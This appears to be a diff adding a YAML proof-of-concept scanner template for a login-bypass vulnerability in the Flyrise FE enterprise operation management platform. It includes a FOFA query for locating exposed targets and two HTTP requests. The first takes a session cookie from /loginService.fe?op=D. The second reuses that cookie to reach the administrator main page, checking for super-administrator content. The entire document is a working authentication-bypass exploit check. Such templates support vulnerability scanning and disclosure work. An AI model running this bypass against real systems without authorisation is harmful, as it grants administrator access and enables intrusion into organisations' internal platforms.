@@ -1,0 +1,29 @@
+id: poc-yaml-flyrise-enterprise-operation-management-platform-loginservice-fe-login-bypass
+info:
+  name: 飞企互联-FE 企业运营管理平台 loginService.fe 登录绕过漏洞
+  severity: high
+  tags:
+  - 认证绕过
+  finger: 企业运营管理平台
+  fofa: app="飞企互联-FE企业运营管理平台"
+requests:
+- method: GET
+  path: /loginService.fe?op=D
+  expression: status_code == 200 && matches(headers,"JSESSIONID=(?P<cookie>.*?);")
+  output:
+  - regex_match(headers,"JSESSIONID=(?P<cookie>.*?);")
+- method: GET
+  path: /main/main.jsp
+  headers:
+    Cookie: JSESSIONID={{.cookie}}
+  expression: 'status_code == 200 &&
+
+    contains(body,"超级管理员") &&
+
+    contains(body,"岗位管理") &&
+
+    contains(body,"退出")
+
+    '
+variables: {}
+transport: http
